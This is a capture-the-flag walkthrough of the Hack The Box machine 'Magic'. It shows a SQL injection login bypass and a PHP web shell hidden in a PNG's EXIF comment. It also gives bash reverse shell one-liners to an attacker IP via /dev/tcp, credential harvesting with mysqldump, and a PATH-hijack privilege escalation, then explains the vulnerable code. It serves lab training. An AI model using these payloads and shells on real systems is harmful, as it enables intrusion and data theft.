## Default Information
IP Address: 10.10.10.185\
OS: Linux

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.185    magic.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.185 --rate=1000 -e tun0
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-12-29 15:00:46 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 80/tcp on 10.10.10.185                                    
Discovered open port 22/tcp on 10.10.10.185 
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22  | SSH | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | Open |
| 80  | HTTP | Apache httpd 2.4.29 ((Ubuntu)) | Open |

### Gobuster
We will then use Gobuster to find the endpoints that are accessible from http://swagshop.htb

```
http://10.10.10.185:80/assets               (Status: 301) [Size: 313] [--> http://10.10.10.185/assets/]
http://10.10.10.185:80/images               (Status: 301) [Size: 313] [--> http://10.10.10.185/images/]
http://10.10.10.185:80/index.php            (Status: 200) [Size: 4053]
http://10.10.10.185:80/index.php            (Status: 200) [Size: 4052]
http://10.10.10.185:80/login.php            (Status: 200) [Size: 4221]
http://10.10.10.185:80/logout.php           (Status: 302) [Size: 0] [--> index.php]
http://10.10.10.185:80/upload.php           (Status: 302) [Size: 2957] [--> login.php]
```

## Exploit
### SQL Injection on login.php

Navigating to http://magic.htb/login.php, we are able to find a login page. Using intruder, we are able to find that the login page is vulnerable to SQL Injection attack. Using ```admin'#:admin``` will then redirect us http://magic.htb/upload.php

![SQL Injection](https://github.com/joelczk/writeups/blob/main/HTB/Images/Magic/sql_injection.png)

### File upload vulnerabilities
Attempting to upload a php reverse shell on http://magic.htb/upload.php tells us that obly JPG,JPEG and PNG files can be uploaded.
![Failed file upload](https://github.com/joelczk/writeups/blob/main/HTB/Images/Magic/failed_file_upload.png)

Attempting to modify the file extensions to become .php.png also results in another error message. There is probably some verification done at the backend to detect for such php reverse shells

![What are you trying to do image](https://github.com/joelczk/writeups/blob/main/HTB/Images/Magic/what_are_you_trying_to_do.png)

Let us then try to upload a normal image file onto http://magic.htb/upload.php. We realize that the uploaded image can then be found at http://magic.htb/images/upload/index.png

Next, we shall try to bypass magic headers to upload the file. This time, we are able to successfully upload the image file. 

```
┌──(kali㉿kali)-[~/Desktop]
└─$ exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' exploit.png
    1 image files updated
                                                  
┌──(kali㉿kali)-[~/Desktop]
└─$ mv exploit.png exploit.php.png
```

Navigating to http://magic.htb/images/uploads/exploit.php.png?cmd=id, we realize that the id command has been successfully executed.

![File Upload Vulnerability](https://github.com/joelczk/writeups/blob/main/HTB/Images/Magic/file_upload_vuln.png)

### Obtaining reverse shell
Using the file upload vulnerability that we have found previously, we will be able to execute a reverse shell command. 

By visiting http://magic.htb/images/uploads/exploit.php.png?cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.8%2F4000%200%3E%261%27, we will be able to spawn a reverse shell. 

All we have to do now is to stabilize the reverse shell.

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4000
listening on [any] 4000 ...
connect to [10.10.16.8] from (UNKNOWN) [10.10.10.185] 41020
bash: cannot set terminal process group (1179): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/Magic/images/uploads$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@ubuntu:/var/www/Magic/images/uploads$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<ads$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@ubuntu:/var/www/Magic/images/uploads$ export TERM=xterm
export TERM=xterm
www-data@ubuntu:/var/www/Magic/images/uploads$ stty cols 132 rows 34
stty cols 132 rows 34
www-data@ubuntu:/var/www/Magic/images/uploads$ 
```

### Privilege Escalation to theseus 
However, we realize that we do not have the required permissions to view the user flag in the theseus directory. 

```
www-data@ubuntu:/home$ ls
ls
theseus
www-data@ubuntu:/home$ cat theseus/user.txt
cat theseus/user.txt
cat: theseus/user.txt: Permission denied
www-data@ubuntu:/home$ 
```

Viewing /var/www/Magic/db.php5 file, we are able to find a set of credentials belonging to theseus

```
www-data@ubuntu:/var/www/Magic$ cat db.php5
cat db.php5
<?php
class Database
{
    private static $dbName = 'Magic' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';
```

Using this set of credentials, we will try to su into theseus user. Unfortunately, this is not the password for theseus user.

```
www-data@ubuntu:/var/www/Magic$ su - theseus
su - theseus
Password: iamkingtheseus

su: Authentication failure
```

We also realize that mysql is not found on this machine. Fortunately, mysqldump is found on this machine. 

```
www-data@ubuntu:/var/www/Magic$ mysql
mysql

Command 'mysql' not found, but can be installed with:

apt install mysql-client-core-5.7   
apt install mariadb-client-core-10.1

Ask your administrator to install one of them.

www-data@ubuntu:/var/www/Magic$ mysqldump
mysqldump
Usage: mysqldump [OPTIONS] database [tables]
OR     mysqldump [OPTIONS] --databases [OPTIONS] DB1 [DB2 DB3...]
OR     mysqldump [OPTIONS] --all-databases [OPTIONS]
For more options, use mysqldump --help
```

Using mysqldump, we can dump the mysql databases.

```
www-data@ubuntu:/var/www/Magic$ mysqldump --user=theseus --password=iamkingtheseus --all-databases
```

Viewing the dump, we are able to find a pair of credentials for the admin user.
```
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
```
However, using this set of credentials, we realize that the user admin does not exist on this machine. Neither are we able to dump out the mysql database files using this set of credentials.

```
www-data@ubuntu:/var/www/Magic$ su admin
su admin
No passwd entry for user 'admin'
www-data@ubuntu:/var/www/Magic$ mysqldump --user=admin --password=Th3s3usW4sK1ng --all-databases
mysqldump --user=admin --password=Th3s3usW4sK1ng --all-databases
mysqldump: [Warning] Using a password on the command line interface can be insecure.
mysqldump: Got error: 1045: Access denied for user 'admin'@'localhost' (using password: YES) when trying to connect
```

We will then try to su to the theseus using the password for admin. Fortunately, we are able to escalate to the theseus user.

```
www-data@ubuntu:/var/www/Magic$ su - theseus
su - theseus
Password: Th3s3usW4sK1ng

theseus@ubuntu:~$ id
id
uid=1000(theseus) gid=1000(theseus) groups=1000(theseus),100(users)
```

### Obtaining user flag

```
theseus@ubuntu:~$ cat /home/theseus/user.txt
cat /home/theseus/user.txt
<Redacted user flag>
```
### Privilege Escalation to root

Using linpeas, we are able to discover a binary (/bin/sysinfo) with SGID bit that is set. We also realize that /bin/sysinfo is executing fdisk and we can potentially impersonate the fdisk.

```
-rwsr-x--- 1 root users 22K Oct 21  2019 /bin/sysinfo (Unknown SUID binary)
  --- It looks like /bin/sysinfo is executing cat and you can impersonate it (strings line: cat /proc/cpuinfo) (https://tinyurl.com/suidpath)
  --- It looks like /bin/sysinfo is executing fdisk and you can impersonate it (strings line: fdisk -l) (https://tinyurl.com/suidpath)
  --- It looks like /bin/sysinfo is executing lshw and you can impersonate it (strings line: lshw -short) (https://tinyurl.com/suidpath)
```

Decompiling the binary, we can find that fdisk and lshw are executed without specifying the full path. This leaves the binary vulnerable to path hijacking attacks. 

![sysinfo](https://github.com/joelczk/writeups/blob/main/HTB/Images/Magic/sysinfo.png)

First, we will create a reverse shell payload into the fdisk binary in the /tmp directory

```
theseus@ubuntu:/tmp$ echo -e '#!/bin/bash\n\n/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.8/2000 0>&1"' > fdisk
echo -e '#!/bin/bash\n\n/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.8/2000 0>&1"' > fdisk
theseus@ubuntu:/tmp$ cat fdisk
cat fdisk
#!/bin/bash

/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.8/2000 0>&1"
theseus@ubuntu:/tmp$ chmod +x fdisk
chmod +x fdisk
```

Next, we will add the /tmp into our $PATH environment variable.

```
theseus@ubuntu:/tmp$ echo $PATH
echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
theseus@ubuntu:/tmp$ export PATH="/tmp:$PATH"
export PATH="/tmp:$PATH"
theseus@ubuntu:/tmp$ echo $PATH
echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

Executing sysinfo will then spawn the reverse shell.

### Obtaining root flag
```
root@ubuntu:/tmp# cat /root/root.txt
cat /root/root.txt
<Redacted root flag>
```

## Post Exploitation
### Exploring file upload in upload.php
In upload.php, we realize that we are only able to upload JPG, PNG or JPEG files. However, in the code that was used to validate the file types, ```pathinfo``` is used, and ```pathinfo``` returns the $imageFileType as the last file extension if there are multiple file extensions.

This will essentially means that for a .php.png file, the $imageFileType will be png which means that the uploaded file will then be passed on to the next step.
```
    $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));
    if ($imageFileType != "jpg" && $imageFileType != "png" && $imageFileType != "jpeg") {
        echo "<script>alert('Sorry, only JPG, JPEG & PNG files are allowed.')</script>";
        $uploadOk = 0;
    }
```

In the next step, the uploaded file will then execute the ```exif_imagetype``` command to check the magic bytes of the uploaded file. This presents a vulnerability whereby any attacker can just modify the rest of the uploaded file's metadata without modifying the magic bytes for arbitary code execution.

```
    if ($uploadOk === 1) {
        // Check if image is actually png or jpg using magic bytes
        $check = exif_imagetype($_FILES["image"]["tmp_name"]);
        if (!in_array($check, $allowed)) {
            echo "<script>alert('What are you trying to do there?')</script>";
            $uploadOk = 0;
        }
    }
```

### SQL Injection at login.php
Looking at the login.php page, we are able to find the SQL query that is being used. Since the $username and $password are not being properly filtered, the SQL command that is being executed will become ```SELECT * FROM login where username='admin'#' AND password='admin'```. 
This essentially means that as long as the ```admin``` username exists on the database, we will be able to authenticate into the website.
```
$stmt = $pdo->query("SELECT * FROM login WHERE username='$username' AND password='$password'");
```

However, at the same time, we also notice that there are some blacklistinf of the inputs such that not all SQL Injection attacks can be used. SQL Injection containing "sleep" and "benchmark" will be detected and will not be accepted.
